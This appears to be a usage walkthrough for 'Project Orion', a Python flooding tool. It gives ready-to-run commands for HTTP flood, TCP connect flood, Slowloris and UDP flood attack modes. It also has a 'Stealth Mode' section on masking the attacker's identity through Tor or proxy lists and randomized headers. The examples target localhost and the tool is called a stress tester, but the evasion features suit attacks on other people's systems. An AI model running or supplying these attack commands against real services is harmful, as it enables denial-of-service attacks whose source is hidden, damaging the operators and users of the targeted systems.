# Project Orion: Supernova Upgrade - Walkthrough

## Overview
**Project Orion** has been upgraded to **Version 2.0 (Supernova)**. It now features an asynchronous core for high-concurrency stress testing and a premium "Matrix-style" terminal interface.

## ⚠️ Important: Environment Setup
The new version requires dependencies that may not be installed in your environment.

### 1. Install Dependencies
It is best to use a virtual environment to avoid system conflicts.

```bash
# Create virtual environment
python3 -m venv venv

# Install dependencies into venv
./venv/bin/pip install -r project_orion/requirements.txt
```

## 🚀 Usage Guide

### Launching Orion
You must use the python executable inside the virtual environment:

```bash
./venv/bin/python project_orion/orion.py --target <TARGET> --mode <MODE> [OPTIONS]
```

### Attack Modes

#### 1. Betelgeuse (Async HTTP Flood)
High-volume GET requests.
```bash
./venv/bin/python project_orion/orion.py --target http://localhost:8080 --mode betelgeuse --time 30
```

#### 2. Rigel (Async TCP Connect)
Rapid TCP connection checks.
```bash
./venv/bin/python project_orion/orion.py --target localhost --port 22 --mode rigel --time 20
```

#### 3. Bellatrix (Slowloris)
Low-and-slow stress test.
```bash
./venv/bin/python project_orion/orion.py --target localhost --port 8080 --mode bellatrix --time 60
```

#### 4. Mintaka (UDP Volley)
Fire-and-forget UDP packet flood.
```bash
./venv/bin/python project_orion/orion.py --target localhost --port 5000 --mode mintaka --time 15
```

## 🕵️‍♂️ Stealth Mode (New!)
Mask your identity by routing attacks through proxies and randomizing headers.

### Usage
- **Single Proxy**:
  ```bash
  ./venv/bin/python project_orion/orion.py --target <TARGET> --mode betelgeuse --proxy socks5://127.0.0.1:9050
  ```
- **Proxy List** (Recommended):
  Create a file `proxies.txt` with one proxy per line (e.g., `socks5://IP:PORT`, `http://IP:PORT`).
  ```bash
  ./venv/bin/python project_orion/orion.py --target <TARGET> --mode betelgeuse --proxylist proxies.txt
  ```

## 📊 Features
- **Live Dashboard**: Real-time stats with `rich` TUI.
- **Stealth Protection**: Proxy rotation (SOCKS4/5, HTTP) and User-Agent/Referer randomization.
- **Mission Reports**: JSON reports are automatically saved to the current directory after each mission.


## 🛡️ Verification
To verify the installation:
1. Start a local server: `python3 -m http.server 8080`
2. Run Orion: `python3 project_orion/orion.py --target http://localhost:8080 --mode betelgeuse --time 5`
3. You should see the nice TUI and a report saved at the end.
